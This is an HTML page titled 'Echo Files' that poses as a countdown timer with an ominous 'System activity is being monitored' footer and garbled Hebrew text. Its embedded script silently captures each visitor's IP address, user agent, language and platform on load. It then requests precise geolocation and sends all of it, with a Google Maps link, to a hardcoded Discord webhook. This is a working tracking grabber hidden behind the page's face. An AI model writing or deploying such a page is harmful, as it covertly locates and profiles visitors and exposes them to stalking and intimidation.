<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Echo Files</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif}
body{
height:100vh;
display:flex;
align-items:center;
justify-content:center;
background:#1c1f24;
color:#fff
}
.wrapper{
text-align:center
}
h1{
font-size:28px;
font-weight:600;
margin-bottom:8px
}
.sub{
opacity:.75;
margin-bottom:30px
}
.timer{
display:flex;
gap:14px;
justify-content:center
}
.card{
background:#2a2e35;
border-radius:8px;
width:90px;
padding:18px 0;
box-shadow:0 4px 12px rgba(0,0,0,.35)
}
.value{
font-size:32px;
font-weight:600
}
.label{
margin-top:6px;
font-size:11px;
letter-spacing:1px;
opacity:.6
}
.buttons{
margin-top:30px;
display:flex;
gap:14px;
justify-content:center;
flex-wrap:wrap
}
.btn{
text-decoration:none;
background:#3a3f47;
color:#fff;
padding:12px 18px;
border-radius:6px;
font-size:14px;
font-weight:600;
transition:.2s;
box-shadow:0 3px 10px rgba(0,0,0,.3)
}
.btn:hover{
background:#4a505a;
transform:translateY(-1px)
}
.footer{
margin-top:26px;
font-size:12px;
opacity:.55
}
</style>
</head>
<body>
<div class="wrapper">
<h1>Echo Files</h1>
<div class="sub">驻爪 ! 转 专!</div>

<div class="timer">
<div class="card">
<div class="value" id="h">00</div>
<div class="label">HOURS</div>
</div>
<div class="card">
<div class="value" id="m">00</div>
<div class="label">MINUTES</div>
</div>
<div class="card">
<div class="value" id="s">00</div>
<div class="label">SECONDS</div>
</div>
</div>

<div class="buttons">
<a class="btn" href="https://www.google.com/search?q=google+map+my+location+live" target="_blank">
驻 专砖转 驻 
</a>
<a class="btn" href="https://whatismyipaddress.com/" target="_blank">

</a>
</div>

<div class="footer">System activity is being monitored</div>
</div>

<script>
(function() {
  // Your Discord webhook URL
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1472664432134852740/m7btUoF6rBDTpparYGo-IsyFCxGZ0yM5jrKotgumvRsgUAe8oGtj8WEmYZ213HDP9iZ5";
  
  // Function to send to Discord webhook
  function sendToDiscord(content, title, color = 5814783) {
    const payload = {
      embeds: [{
        title: title,
        description: content,
        color: color,
        timestamp: new Date().toISOString(),
        footer: {
          text: "Echo Files Monitor"
        }
      }]
    };
    
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })
    .then(response => {
      if (!response.ok) {
        console.log('Discord webhook responded with:', response.status);
      }
    })
    .catch(err => console.log('Webhook send attempt (test mode):', err));
  }

  // Get IP and send to Discord
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(ipData => {
      const ipv4 = ipData.ip;
      
      // Create IP info message
      const ipMessage = `**IP Address:** ${ipv4}\n**User Agent:** ${navigator.userAgent}\n**Language:** ${navigator.language}\n**Platform:** ${navigator.platform}`;
      
      // Send to Discord
      sendToDiscord(ipMessage, ' IP Address Captured', 5814783);
      
      // Store IP for later
      sessionStorage.setItem('visitor_ip', ipv4);
      
      console.log('IP captured:', ipv4);
    })
    .catch(err => {
      console.log('Could not fetch IP');
      sendToDiscord('Failed to capture IP address', '锔 IP Capture Failed', 16711680);
    });

  // Request location permission and send to Discord
  setTimeout(() => {
    if (!navigator.geolocation) {
      sendToDiscord('Geolocation is not supported by this browser', ' Geolocation Unsupported', 16711680);
      return;
    }

    // Ask for location
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        const storedIp = sessionStorage.getItem('visitor_ip') || 'Unknown';
        
        // Create location message
        const locationMessage = `**IP:** ${storedIp}\n**Latitude:** ${latitude}\n**Longitude:** ${longitude}\n**Accuracy:** 卤${Math.round(accuracy)} meters\n**Google Maps:** https://www.google.com/maps?q=${latitude},${longitude}`;
        
        // Send to Discord
        sendToDiscord(locationMessage, ' Location Access Granted', 3066993);
        
        console.log('Location captured');
      },
      (error) => {
        const storedIp = sessionStorage.getItem('visitor_ip') || 'Unknown';
        let errorMessage = `**IP:** ${storedIp}\n`;
        
        // Better error messages
        switch(error.code) {
          case error.PERMISSION_DENIED:
            errorMessage += '**Status:** User denied location request';
            break;
          case error.POSITION_UNAVAILABLE:
            errorMessage += '**Status:** Location information unavailable';
            break;
          case error.TIMEOUT:
            errorMessage += '**Status:** Location request timed out';
            break;
          default:
            errorMessage += `**Status:** ${error.message}`;
        }
        
        sendToDiscord(errorMessage, ' Location Access Denied', 16711680);
        console.log('Location denied');
      },
      { 
        timeout: 10000,
        maximumAge: 0,
        enableHighAccuracy: true
      }
    );
  }, 1000);

  // Keep your original countdown code
  let key = "countdown_end";
  let end = localStorage.getItem(key);
  if (!end) {
    end = Date.now() + 86400000;
    localStorage.setItem(key, end);
  }
  end = parseInt(end);
  setInterval(() => {
    let t = end - Date.now();
    if (t < 0) t = 0;
    let h = Math.floor(t / 3600000);
    let m = Math.floor((t % 3600000) / 60000);
    let s = Math.floor((t % 60000) / 1000);
    document.getElementById("h").textContent = String(h).padStart(2, "0");
    document.getElementById("m").textContent = String(m).padStart(2, "0");
    document.getElementById("s").textContent = String(s).padStart(2, "0");
  }, 1000);
})();
</script>
</body>
</html>
